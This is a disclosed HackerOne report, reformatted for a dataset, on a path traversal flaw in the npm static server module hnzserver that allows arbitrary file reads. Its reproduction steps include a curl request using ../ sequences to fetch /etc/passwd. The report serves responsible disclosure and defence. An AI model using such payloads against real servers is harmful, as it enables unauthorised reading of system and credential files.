---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '579517'
original_report_id: '579517'
title: '[hnzserver] Path Traversal allowing to read any files on the server'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2019-05-13T20:17:40.604Z'
disclosed_at: '2020-09-24T19:08:36.724Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [hnzserver] Path Traversal allowing to read any files on the server

## Metadata

- HackerOne Report ID: 579517
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-24T19:08:36.724Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report path traversal vulnerability in module "hnzserver"
It allows an attacker to read any files even system files via this path traversal vulnerability.

# Module

module name: hnzserver
version: 2.0.6
npm page: https://www.npmjs.com/package/hnzserver

## Module Description

静态服务器 means "Static server"

## Module Stats

[8] downloads in the last week
[40] downloads in the last month
[40] downloads in week 01-07 Apr

# Vulnerability

##Vulnerability Description
Path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.

##Steps To Reproduce:
- Install the module
```
npm install -g hnzserver
```

- Run 'hnzserver in "~/Desktop" directory :
```
root@kali:~/Desktop# hnzserver
server running is :http://localhost:8888
```
- Use cURL to access etc/passwd file:
```
$ curl --path-as-is --url 'http://127.0.0.1:8888/../../../../etc/passwd'
```
{F489679}

##Patch
User input should be properly sanitized and filtered to remove dot-dot-slash (../)” sequences and its variations in path. 

##Supporting Material/References:
- Linux kali 4.15.0-kali2-amd64
- node 10.15.3
- npm 6.9
- Firefox ESR 52.7.3 (64-bit)

##Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It could have enabled an attacker to view system files and leverage attacks like remote code execution and so on.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
